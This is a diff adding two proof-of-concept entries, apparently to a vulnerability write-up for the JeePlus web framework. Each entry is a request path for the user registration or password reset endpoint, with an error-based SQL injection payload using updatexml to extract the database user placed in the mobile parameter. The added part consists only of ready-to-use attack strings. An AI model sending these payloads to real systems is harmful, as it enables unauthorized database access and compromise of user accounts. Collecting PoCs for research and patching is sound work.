@@ -24,3 +24,13 @@ Accept: */*
 Connection: Keep-Alive
 Cookie: jeeplus.session.id=a24d6e112a864ef795cce1f664a6022a;
 ```
+
+## poc3
+```
+/a/sys/register/registerUser?roleName=wangba&mobile=13300990099'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23&randomCode=2131&loginName=test1&password=123123&confirmNewPassword=123123&ck1=on
+```
+
+## poc4
+```
+/a/sys/user/resetPassword?mobile=13588888888'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23
+```
